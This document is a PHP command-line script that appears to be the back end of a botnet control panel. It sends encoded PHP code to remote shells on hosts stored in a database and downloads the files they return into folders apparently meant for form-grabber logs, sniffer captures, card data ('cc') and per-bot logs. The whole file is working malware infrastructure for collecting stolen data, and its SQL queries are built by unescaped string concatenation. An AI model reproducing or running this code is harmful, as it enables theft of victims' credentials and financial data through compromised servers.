#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '512M');

function real_path($p){
	return str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
}

if(file_exists('../cache/dirs_downloads.json')) $dir = json_decode(file_get_contents('../cache/dirs_downloads.json'), true);
if(empty($dir['script']) || empty($dir['site']) || empty($dir['logs'])){
	$dir = array();
	$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
	$dir['site'] = real_path($dir['script'] . '/../');
	$dir['logs'] = real_path($dir['site'] . '/logs/');
	file_put_contents($dir['site'] . 'cache/dirs_downloads.json', json_encode($dir));
}

ini_set('error_log', $dir['site'] . 'cache/error_downloads_file.txt');
function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8 && !strpos($file, 'geoip.inc')) file_put_contents($dir['site'] . 'cache/error_downloads_file.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

if(!defined('IDOS')) define('IDOS', strtoupper(substr(PHP_OS, 0, 3)));

if(IDOS === 'WIN'){
	exec($dir['script'] . '/pv.exe -pi php-*.exe');
}else{
	exec('/bin/env renice 0 -p ' . $MYPID);
}

include_once($dir['site'] . 'includes/config.php');
require_once($dir['site'] . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
$mysqli->settings["ping"] = true;

unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

if(empty($_SERVER['argv'][1])){
	error_log('EMPTY_ID!',4);
	exit;
}

$MYPID = getmypid();
if(!empty($MYPID)){
	$thread = $mysqli->query('SELECT * FROM bf_threads WHERE (id = \''.$_SERVER['argv'][1].'\') LIMIT 1');
	if($thread->id != $_SERVER['argv'][1]){
		error_log('NOT_ID!',4);
		exit;
	}else{
		$mysqli->query('update bf_threads set pid = \''.$MYPID.'\', status = \'2\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	}
}else{
	error_log('PID_ERROR',4);
    exit;
}

$dl = $mysqli->query('SELECT a.link, a.keyid, a.shell, b.* FROM bf_admins a, bf_files b WHERE (b.id = \''.$thread->post_id.'\') AND (a.id = b.post_id) LIMIT 1');

$fnt = $dir['logs'] . str_replace('/logs/', $dl->post_id . '/', $dl->dl);
if(file_exists($fnt) && filesize($fnt) == $dl->size){
	$mysqli->query('update bf_files set status=\'1\', post_date=NOW(), file=\''.$fnt.'\' WHERE (id=\''.$dl->id.'\') LIMIT 1');
	$mysqli->query('update bf_threads set status = \'255\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	exit;
}

if($dl->status == 1){
	error_log('File has been already downloaded.',4);
	$mysqli->query('update bf_threads set status = \'255\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	exit;
}elseif($dl->id != $thread->post_id){
	$mysqli->query('delete from bf_files WHERE (id=\''.$thread->post_id.'\') LIMIT 1');
	$mysqli->query('update bf_threads set status = \'4\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	//$mysqli->query('update bf_files set status = \'0\' WHERE (id = \''.$thread->post_id.'\')');
	error_log('File not found.',4);
	exit;
}

function get_http_file($link, $data, $file, $key = 'BOTNETCHECKUPDATER1234567893', $shell = '/set/task.html', $sdf = ''){
	global $dl, $mysqli;

	$mysqli->ping();

	if(file_exists($file)) @unlink($file);
    $file_put = fopen($file, 'wb');

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://' . $link . $shell);
	curl_setopt($ch, CURLOPT_FILE, $file_put);
	//curl_setopt($ch, CURLOPT_HEADER, false);
	//curl_setopt($ch, CURLINFO_HEADER_OUT, false);
	curl_setopt($ch, CURLOPT_FAILONERROR, false);
	//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	//curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Expect:' ));
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$key.'&data=' . base64_encode(bin2hex($data)));
	curl_exec($ch);
	//echo curl_getinfo($ch,CURLINFO_HEADER_OUT);

	fclose($file_put);

	if(!empty($sdf)){
		$csd = curl_getinfo($ch, CURLINFO_SPEED_DOWNLOAD);
		if($csd > 0) file_put_contents($sdf, $csd . '|', FILE_APPEND);
	}

	if(@filesize($file) === 0) @unlink($file);

	curl_close($ch);
}

function get_http($link, $data, $key = 'BOTNETCHECKUPDATER1234567893', $shell = '/set/task.html'){
	global $mysqli;

	$mysqli->ping();

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://' . $link . $shell);
	curl_setopt($ch, CURLOPT_FAILONERROR, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Expect:' ) );
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$key.'&data=' . base64_encode(bin2hex($data)));
	$return =  curl_exec($ch);
	curl_close($ch);
	return $return;
}

if(!file_exists($dir['site'] . '/logs/' . $dl->post_id . '/')) @mkdir($dir['site'] . '/logs/' . $dl->post_id . '/');
if(!file_exists($dir['site'] . '/logs/' . $dl->post_id . '/export/')) @mkdir($dir['site'] . '/logs/' . $dl->post_id . '/export/');
//if(!file_exists($dir['site'] . '/logs/' . $dl->post_id . '/import/')) @mkdir($dir['site'] . '/logs/' . $dl->post_id . '/import/');

if(IDOS != 'WIN'){
	@chmod($dir['site'] . '/logs/' . $dl->post_id . '/', 0777);
	@chmod($dir['site'] . '/logs/' . $dl->post_id . '/export/', 0777);
	//@chmod($dir['site'] . '/logs/' . $dl->post_id . '/import/', 0777);
}

$get_php = '$cur_file = \''.$dl->shell.'\';';
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/start.php');
$get_php .= '$file_name = $dir . \''.ltrim($dl->dl, '/').'\';';
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/dl_files.php');

switch($dl->type){
	case 1:
		if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/import/fgr/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/import/fgr/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/import/fgr/', 0777);
		$prefix = str_replace('/logs/import/fgr/', '', $dl->dl);
		$prefix = str_replace('/'.basename($dl->dl), '', $prefix);
		if(!file_exists($dir['logs'] . '/' . $dl->post_id . '/import/fgr/' . $prefix . '/')) @mkdir($dir['logs'] . '/' . $dl->post_id . '/import/fgr/' . $prefix . '/');
		$file = $dir['logs'] . $dl->post_id . '/import/fgr/' . $prefix . '/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 2:
    	if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/import/gra/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/import/gra/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/import/gra/', 0777);
		$prefix = str_replace('/logs/import/gra/', '', $dl->dl);
		$prefix = str_replace('/'.basename($dl->dl), '', $prefix);
		if(!file_exists($dir['logs'] . '/' . $dl->post_id . '/import/gra/' . $prefix . '/')) @mkdir($dir['logs'] . '/' . $dl->post_id . '/import/gra/' . $prefix . '/');
		$file = $dir['logs'] . $dl->post_id . '/import/gra/' . $prefix . '/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 3:
    	if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/import/sni/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/import/sni/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/import/sni/', 0777);
		$prefix = str_replace('/logs/import/sni/', '', $dl->dl);
		$prefix = str_replace('/'.basename($dl->dl), '', $prefix);
		if(!file_exists($dir['logs'] . '/' . $dl->post_id . '/import/sni/' . $prefix . '/')) @mkdir($dir['logs'] . '/' . $dl->post_id . '/import/sni/' . $prefix . '/');
		$file = $dir['logs'] . $dl->post_id . '/import/sni/' . $prefix . '/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 4:
    	if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/import/tra/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/import/tra/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/import/tra/', 0777);
		$prefix = str_replace('/logs/import/tra/', '', $dl->dl);
		$prefix = str_replace('/'.basename($dl->dl), '', $prefix);
		if(!file_exists($dir['logs'] . '/' . $dl->post_id . '/import/tra/' . $prefix . '/')) @mkdir($dir['logs'] . '/' . $dl->post_id . '/import/tra/' . $prefix . '/');
		$file = $dir['logs'] . $dl->post_id . '/import/tra/' . $prefix . '/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 5:
		if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/export/fgr/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/export/fgr/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/export/fgr/', 0777);
		$file = $dir['logs'] . $dl->post_id . '/export/fgr/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 6:
    	if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/export/gra/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/export/gra/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/export/gra/', 0777);
		$file = $dir['logs'] . $dl->post_id . '/export/gra/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 7:
    	if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/export/sni/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/export/sni/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/export/sni/', 0777);
		$file = $dir['logs'] . $dl->post_id . '/export/sni/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 8:
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/import/fgr/', 0777);
		$prefix = str_replace('/logs/bots/', '', $dl->dl);
		$prefix = str_replace('/'.basename($dl->dl), '', $prefix);
		$prefix = explode('/', $prefix);
		$uid = $prefix[1];
		$prefix = $prefix[0];

		if(!file_exists($dir['logs'] . '/bots/' . $prefix . '/')) @mkdir($dir['logs'] . '/bots/' . $prefix . '/');
		if(!file_exists($dir['logs'] . '/bots/' . $prefix . '/' . $uid . '/')) @mkdir($dir['logs'] . '/bots/' . $prefix . '/' . $uid . '/');
		$file = $dir['logs'] . 'bots/' . $prefix . '/' . $uid . '/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 9:
    	if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/cabs/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/cabs/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/cabs/', 0777);
		$file = $dir['logs'] . $dl->post_id . '/cabs/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;

	case 10:
		if(!file_exists($dir['site'] . 'logs/' . $dl->post_id . '/export/cc/')) @mkdir($dir['site'] . 'logs/' . $dl->post_id . '/export/cc/');
		if(IDOS != 'WIN') @chmod($dir['site'] . 'logs/' . $dl->post_id . '/export/cc/', 0777);
		$file = $dir['logs'] . $dl->post_id . '/export/cc/' . basename($dl->dl);
		if(file_exists($file)) unlink($file);
		get_http_file($dl->link, $get_php, $file, $dl->keyid, $dl->shell, $dir['site'] . 'cache/sdf/' . $dl->post_id);
	break;
}

$dl_check = false;

if(@file_exists($file)){
	$file_size = @filesize($file);
	if($file_size == $dl->size){
		$dl_check = true;
	}elseif($file_size > $dl->size){
		$dl_check = true;
	}else{
		$dl_check = false;
	}
}else{
	$dl_check = false;
}

if($dl_check == true){
	$file = str_replace($dir['logs'], '', $file);
	$file = str_replace(ltrim($dir['logs'], '/'), '', $file);
	$mysqli->query('update bf_files set status=\'1\', post_date=NOW(), file=\''.str_replace($dir['logs'], '', $file).'\' WHERE (id=\''.$dl->id.'\') LIMIT 1');
    /*
	if($dl->type == '5' || $dl->type == '7'){
		$get_php = '$cur_file = \''.$dl->shell.'\';';
		$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/start.php');
		$get_php .= '$file_name = $dir . \''.ltrim($dl->dl, '/').'\';' . "\r\n";
		$get_php .= '@unlink($file_name);';
		$resutl = get_http($dl->link, $get_php, $dl->keyid, $dl->shell);
	}
	*/
}else{
	$mysqli->query('update bf_threads set status = \'5\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	//$mysqli->query('update bf_files set status = \'0\' WHERE (id = \''.$dl->id.'\') AND (status != \'1\')');
	$mysqli->query('delete from bf_files WHERE (id=\''.$dl->id.'\') LIMIT 1');

	$text = 'File: ' . $file . "\r\n";
	if(file_exists($file)) $text .= 'Size: ' . filesize($file) . "\r\n";
	$text .= 'DL: ' . print_r($dl, true) . "\r\n";
	$text .= 'Thread: ' . print_r($thread, true) . "\r\n";
	$text .= '-------------------------------------' . "\r\n\r\n";
	file_put_contents( $dir['site'] . 'cache/debug_download.txt', $text, FILE_APPEND);

	if(@file_exists($file)) @unlink($file);

	sleep(1);
	exit;
}

sleep(1);

$mysqli->query('update bf_threads set status = \'255\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');

exit;

?>